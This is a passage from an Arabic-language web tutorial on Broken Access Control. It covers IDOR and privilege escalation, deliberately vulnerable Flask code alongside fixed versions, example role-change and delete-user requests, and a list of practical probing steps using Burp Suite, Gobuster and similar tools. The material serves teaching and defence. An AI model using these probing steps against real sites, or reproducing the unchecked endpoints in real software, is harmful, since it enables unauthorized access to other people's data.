        <p>لو عدلت الرقم لأي id تاني وشفت بيانات شخص غيرك، هنا انت استغليت الـ <strong>Broken Access Control</strong>.</p>
       
        <br>
       
        <h3>أنواع الثغرة وأهم السيناريوهات (Types & Scenarios)</h3>
       
        <h4>1- Vertical Escalation (تصعيد عمودي)</h4>
        <p>زي لما يوزر عادي يدخل صفحة admin أو يغير صلاحيات نفسه ويبقى أدمن.</p>
        <p><strong>مثال:</strong> يوزر عادي يدخل على <code>/admin/dashboard</code> بدون ما يكون عنده صلاحية.</p>
       
        <br>
       
        <h4>2- Horizontal Escalation (تصعيد أفقي)</h4>
        <p>لما يوزر يشوف أو يعدل بيانات مستخدم تاني بنفس الدور.</p>
        <p><strong>مثال:</strong> يوزر بـ id=5 يغير الرقم لـ id=6 ويشوف بيانات يوزر تاني من نفس المستوى.</p>
       
        <br>
       
        <h4>3- Missing Function Access Control</h4>
        <p>زي لما تلاقي API أو وظيفة backend مفتوحة لكل الناس بدون تحقق.</p>
        <p><strong>مثال:</strong></p>
        <pre>POST /api/change_role?user_id=7&role=admin</pre>
        <p>ده أي حد ممكن يبعت الريكوست ويبقى أدمن لو مفيش تحقق جوا الكود.</p>
       
        <br>
       
        <h3>أمثلة عملية بأكواد</h3>
       
        <h4>المثال 1: ثغرة IDOR في بايثون Flask</h4>
        <p><strong>الكود الضعيف:</strong></p>
        <pre>@app.route('/user')
def user_profile():
    user_id = request.args.get('id')
    user = User.query.filter_by(id=user_id).first()
    return jsonify(user.to_dict())</pre>
       
        <p style="color:#ff6b6b;"><strong>المشكلة:</strong> هنا لو غيرت id هتشوف بيانات أي حد.</p>
       
        <br>
       
        <p><strong>تصحيح الكود (Writing the Fix):</strong></p>
        <pre>@app.route('/user')
def user_profile():
    if current_user.id == int(request.args.get('id')) or current_user.role == 'admin':
        user_id = request.args.get('id')
        user = User.query.filter_by(id=user_id).first()
        return jsonify(user.to_dict())
    else:
        abort(403) # ممنوع الوصول</pre>
       
        <p style="color:#51cf66;"><strong>الحل:</strong> تحقق من أن اليوزر بيطلب بياناته هو فقط، أو أنه أدمن.</p>
       
        <br>
       
        <h4>المثال 2: الدخول المباشر للوحة التحكم (Force Browsing)</h4>
        <p>لو فيه صفحة زي <code>/admin/dashboard</code>، وجربت تدخلها كمستخدم عادي واشتغلت معاك، يبقى فيه <strong>Broken Access Control</strong>.</p>
        <p><strong>الحل:</strong> تحقق من صلاحيات اليوزر قبل ما تعرض الصفحة:</p>
        <pre>@app.route('/admin/dashboard')
def admin_dashboard():
    if not current_user.is_admin:
        abort(403)
    return render_template('admin.html')</pre>
       
        <br>
       
        <h4>المثال 3: API بدون تحقق</h4>
        <pre>POST /api/delete_user?user_id=8</pre>
        <p>لو أي يوزر يقدر يحذف يوزر تاني عن طريق إنه يبعت ريكوست فيه id من غير تحقق صلاحيات، يبقى النظام فيه ثغرة خطيرة.</p>
        <p><strong>الحل:</strong></p>
        <pre>@app.route('/api/delete_user', methods=['POST'])
def delete_user():
    if current_user.role != 'admin':
        abort(403)
    user_id = request.args.get('user_id')
    User.query.filter_by(id=user_id).delete()
    return jsonify({"status": "deleted"})</pre>
       
        <br>
       
        <h3>الاستغلال العملي (Practical Exploitation)</h3>
        <ol>
          <li>جرب تغير باراميتر زي <code>id</code> في أي request.</li>
          <li>حاول تدخل صفحات أو وظائف مش ظاهرة ليك.</li>
          <li>استخدم أدوات زي <strong>Burp Suite</strong> أو <strong>OWASP ZAP</strong> لتعديل الريكوستات.</li>
          <li>راقب الريسبونس، أحياناً فيه بيانات بتظهر وانت مش مفروض تشوفها.</li>
          <li>جرب تغيير HTTP Method (من GET لـ POST أو DELETE).</li>
          <li>ابحث عن endpoints مخفية باستخدام tools زي <strong>Dirsearch</strong> أو <strong>Gobuster</strong>.</li>
        </ol>
       
        <br>
       
        <h3>أماكن ظهورها في المواقع</h3>
        <ul>
          <li>صفحات الإعدادات أو الملفات الشخصية.</li>
          <li>لوحة الإدارة (Admin Panel).</li>
          <li>واجهات الـ API اللي فيها تعديل أو حذف أو إضافة بيانات.</li>
          <li>روابط فيها أرقام أو معرفات (IDs).</li>
          <li>صفحات رفع الملفات أو تحميلها.</li>
          <li>وظائف تغيير كلمات المرور أو الإيميلات.</li>
        </ul>
       
        <br>
       
        <h3>أسباب حدوثها (Why does it happen?)</h3>
        <ul>
          <li>الاعتماد على تحقق الصلاحيات في الـ <strong>frontend</strong> بس أو نسيان التحقق في الـ <strong>backend</strong>.</li>
          <li>عدم ربط الوظائف الحساسة بجلسة المستخدم.</li>
          <li>إعطاء صلاحيات واسعة أو غير محسوبة.</li>
          <li>عدم استخدام <strong>Role-Based Access Control (RBAC)</strong> بشكل صحيح.</li>
          <li>الاعتماد على <strong>Security by Obscurity</strong> (إخفاء الروابط بدل حمايتها).</li>
        </ul>
       
        <br>
       
        <h3>طرق الحماية (How to Prevent)</h3>
        <ul>
          <li><strong>تحقق دائماً من الصلاحيات في الـ Backend:</strong> لا تعتمد أبداً على الـ Frontend.</li>
          <li><strong>استخدم Session-Based Authorization:</strong> اربط كل action بجلسة المستخدم الحالي.</li>
          <li><strong>طبق مبدأ Least Privilege:</strong> أعطي كل يوزر أقل الصلاحيات اللي يحتاجها.</li>
          <li><strong>استخدم Framework Security Features:</strong> معظم الـ Frameworks زي Django و Laravel عندها حماية مدمجة.</li>
          <li><strong>سجل كل المحاولات المشبوهة (Logging):</strong> علشان تقدر تتتبع أي هجمات.</li>
          <li><strong>اعمل Penetration Testing دوري:</strong> اختبر موقعك بشكل منتظم.</li>
        </ul>
       
        <br>
       
        <h3>نصائح إضافية للباحثين عن الثغرات (Bug Hunters)</h3>
        <ul>
          <li>ابحث عن معرفات (IDs) في URLs، Cookies، Headers.</li>
          <li>جرب تبديل الـ HTTP Methods (GET → POST → PUT → DELETE).</li>
          <li>اختبر APIs بشكل مكثف لأنها غالباً أقل حماية من الواجهة.</li>
          <li>استخدم حسابين مختلفين لاختبار Horizontal Escalation.</li>
          <li>ابحث عن endpoints مخفية أو قديمة (Legacy APIs).</li>
        </ul>
       
        <br>
       
        <p style="color:#21ffe7; font-size:1.1em;"><strong>خلاصة:</strong></p>
        <p>
          <strong>Broken Access Control</strong> من أخطر الثغرات لأنها بتخلي أي حد يوصل لبيانات أو وظائف مش من حقه.
          الحماية الصحيحة بتبدأ من <strong>Server-Side Validation</strong> وتطبيق صارم لقواعد الصلاحيات على كل request.
        </p>
       
        <p style="text-align:center; margin-top:2em;">
          <strong style="color:#51cf66;">بالتوفيق في رحلتك! 
        </div>
      </div>
  </div>

  <script>
    // Matrix Background effect
    const canvas = document.querySelector('.matrix-bg');
    const ctx = canvas.getContext('2d');
    let w = window.innerWidth;
    let h = window.innerHeight;
    canvas.width = w;
    canvas.height = h;
    const cols = Math.floor(w / 18);
    const ypos = Array(cols).fill(0);
   
    function matrix() {
      ctx.fillStyle = '#13181bcc';
      ctx.fillRect(0, 0, w, h);
      ctx.fillStyle = '#19FFAA';
      ctx.font = '16px monospace';
      ypos.forEach((y, ind) => {
        const text = String.fromCharCode(Math.random() * 128);
        ctx.fillText(text, ind * 18, y);
        if (y > h + Math.random() * 10000) ypos[ind] = 0;
        else ypos[ind] = y + 16;
      });
    }
   
    setInterval(matrix, 60);
   
    window.onresize = () => {
      w = window.innerWidth;
      h = window.innerHeight;
      canvas.width = w;
      canvas.height = h;
    };
   
    // Show the explanation on card click
    function toggleExplain(el) {
      let detail = el.querySelector('.explain');
      detail.style.display = (detail.style.display === 'block') ? 'none' : 'block';
    }
  </script>
</body>
</html>
